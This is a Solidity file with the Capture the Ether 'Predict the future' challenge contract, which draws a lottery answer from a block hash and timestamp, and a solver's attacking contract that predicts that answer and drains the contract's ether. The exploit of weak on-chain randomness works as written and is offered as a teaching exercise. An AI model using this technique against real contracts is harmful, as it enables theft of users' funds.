pragma solidity ^0.4.21;

/**
@title Predict the future - Capture the Ether - Lotteries 5
@author broccolirob (solver, not author)
@notice Deployed on Ropsten at "0x524114778B4A48CAD68103f8689A3B217dc3C2B2".
Attacking contract can be found below this one.
Solution script can be found in scripts/predict-future.js
 */

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract AttackPTFChallenge {
    uint8 constant GUESS = 1;

    function attack(address target) external payable {
        require(msg.value == 1 ether);
        PredictTheFutureChallenge(target).lockInGuess.value(msg.value)(GUESS);
    }

    function settle(address target) external {
        uint8 thisGuess = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;
        require(GUESS == thisGuess);
        PredictTheFutureChallenge(target).settle();
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
